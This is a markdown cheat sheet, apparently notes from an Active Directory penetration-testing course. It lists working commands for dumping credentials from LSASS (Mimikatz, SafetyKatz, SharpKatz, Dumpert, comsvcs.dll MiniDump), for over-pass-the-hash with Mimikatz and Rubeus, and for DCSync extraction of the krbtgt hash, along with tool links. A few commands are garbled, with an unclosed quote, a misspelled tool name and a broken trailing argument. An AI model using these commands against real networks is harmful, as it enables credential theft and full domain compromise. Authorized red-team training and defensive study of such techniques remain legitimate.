# Lateral Movement - Mimikatz / PtH / DCSync

- [Lateral Movement - Mimikatz / PtH / DCSync](#lateral-movement---mimikatz--pth--dcsync)
  - [Mimikatz](#mimikatz)
  - [Extracting credential from LSASS](#extracting-credential-from-lsass)
  - [Over Pass-the-hash](#over-pass-the-hash)
  - [DCSync](#dcsync)

---

## Mimikatz 

Mimikatz can be used to dump credentials, tickets, and many more interesting attacks.

`Invoke-Mimikatz` is a PowerShell version of Mimikatz. Using the code from **ReflectivePEInjection**, mimikatz is loaded reflectively into the memory, and all functions of mimikatz could be used from this script.

Note both `Mimikatz.exe` and `Invoke-Mimikatz.ps1` have to be run in **Admin Privilege** for dumping credentials from local machine. Many attacks need specific privileges which are covered while discussing that attack.

Note:
- http://github.com/gentilkiwi/mimikatz
- http://adsecurity.org/?p=2207

<br/>

---

## Extracting credential from LSASS

**Dump credential on a local machine using Mimikatz**

```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

<br/>

**SafetyKatz**

- Minidump of lsass and PELoader to run Mimikatz

```
SafetyKatz.exe "sekurlsa::ekeys"
```

<br/>

**Dump credentials using SharpKatz**

- C# port of some of Mimikatz functionality

```
SharpKatz.exe --Command eKeys
```

<br/>

**Dump credentials using Dumpert**

- Direct system calls and API unhooking

```
rundll32.exe C:\Dumpert\Outflack-Dumpert.dll,DUMP
```

<br/>

Note:
- https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1
- https://github.com/b4rtik/SharpKatz
- https://github.com/outflanknl/Dumpert
- https://github.com/Flangvik/BetterSafetyKatz
- https://github.com/GhostPack/SafetyKatz

<br/>

**Using pypykatz**

- Mimikatz functionality in Python

```
pypykatz.exe live lsa
```

<br/>

**Using comsvcs.dll**

```
tasklist /FI "IMAGENAME eq lsass.exe"
```

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass PID> C:\Users\Public\lsass.dump full
```

<br/>

Also:

- Linux attacking AD - use `impacket` / `Physmem2profit`

<br/>

Note:
- https://github.com/skelsec/pypykatz
- https://github.com/Hackndo/lsassy
- https://github.com/SecureAuthCorp/impacket/
- https://github.com/FSecureLABS/physmem2profit

<br/>

---

## Over Pass-the-hash

**Over Pass-the-Hash (OPTH)** generate tokens from hashes or keys. To perform, you need a elevated prompt (admin privs):

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe
```

```
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
```

Note:
The above commands starts a PS / CMD session with a **logon type 9** (same as `runas /netonly`).
More about logon event:
- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787567(v=ws.10)

<br/>

The command below doesn't need elevation:

```
Rubeus.exe asktgt /user:administrator /rc4:<ntlm> /ptt
```

<br/>

The command below needs elevation:

```
Rebeus.exe asktgt /user:administrator /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

- https://github.com/GhostPack/Rubeus/

---

## DCSync

To extract credentials from the DC without code execution on the DC, we can use **DCSync**. Note by default, **Domain **Privilege**** are required to run DCSync.

To use the DCSync feature for getting krbtgt hash execute the below command with Domain Admin privileges for the `us` domain:

- Mimikatzs:

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

- SafetyKatz

```
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "trust.
```

<br/>

----